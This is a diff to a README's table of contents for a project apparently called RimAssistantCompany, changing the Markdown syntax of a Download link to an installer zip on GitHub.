@@ -36,7 +36,7 @@
 - [RimAssistantCompany](#rimassistantcompany)
   - [Disclaimer](#disclaimer)
   - [Features](#features)
-  - [Download]((https://github.com/RatioRatPier/RimAssistantLimbusCompany/blob/main/Installer-V2.5.1.zip))
+  - [Download]([https://github.com/RatioRatPier/RimAssistantLimbusCompany/blob/main/Installer-V2.5.1.zip])
   - [Contributing](#contributing)
   - [Acknowledgements](#acknowledgements)
   - [Final Notes](#final-notes)
